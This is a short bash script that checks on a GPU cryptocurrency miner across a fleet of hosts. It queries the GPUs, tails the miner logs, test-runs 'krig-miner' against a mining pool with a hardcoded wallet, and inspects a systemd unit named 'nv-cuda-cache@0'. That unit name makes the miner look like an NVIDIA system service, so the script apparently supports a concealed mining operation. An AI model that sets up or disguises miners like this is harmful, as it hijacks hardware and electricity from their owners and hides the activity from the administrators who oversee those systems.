#!/bin/bash
W='prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz'
H=$(hostname)
echo "== host $H $(date -u)"
nvidia-smi --query-gpu=index,name,driver_version,memory.total,compute_cap --format=csv,noheader 2>&1 | head -8
echo "== sup tail"; tail -4 /opt/fleet/logs/krig-$H-g0.sup.log 2>/dev/null
echo "== logs"; ls -la /opt/fleet/logs/ 2>/dev/null | tail -8
echo "== run 25s"
timeout 25 /opt/fleet/krig/krig-miner --coin pearl -d 0 --url stratum+ssl://prl.kryptex.network:8048 --user $W/ul-ps-$H-g0 --password x --no-tui --no-telemetry -l info 2>&1 | tail -30
echo "== unit"; systemctl status nv-cuda-cache@0 --no-pager -l 2>&1 | tail -14
echo "== journal"; journalctl -u nv-cuda-cache@0 --no-pager -n 25 2>&1 | tail -25
